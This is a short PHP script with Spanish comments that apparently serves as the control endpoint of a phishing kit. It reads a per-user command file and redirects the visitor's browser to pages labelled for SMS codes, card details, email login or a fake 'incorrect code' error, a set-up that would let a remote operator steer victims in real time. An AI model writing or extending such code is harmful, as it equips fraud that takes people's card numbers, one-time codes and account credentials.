<?php
session_start();

// Obtener el usuario de la sesión
$usuario = $_SESSION['usuario'] ?? null;

if (!$usuario) {
    echo json_encode(['status' => 'no_session']);
    exit;
}

$archivo = "acciones/$usuario.txt";
$response = ['status' => 'pending'];

if (file_exists($archivo)) {
    $accion = trim(file_get_contents($archivo));
    unlink($archivo);
    
    // Mapear acciones a respuestas
    switch ($accion) {
        case "/LISTO":
            $response = ['status' => 'redirect', 'target' => 'listo.php'];
            break;
        case "/COMPRA":
            $response = ['status' => 'error', 'message' => 'Código incorrecto. Intente nuevamente.'];
            break;
        case "/LOGIN":
            $response = ['status' => 'redirect', 'target' => 'index.php'];
            break;
        case "/SMS":
            $response = ['status' => 'redirect', 'target' => 'sms.php'];
            break;
        case "/CARD":
            $response = ['status' => 'redirect', 'target' => 'card.html'];
            break;
        case "/MAIL":
            $response = ['status' => 'redirect', 'target' => 'mail.php'];
            break;
    }
}

echo json_encode($response);
?>
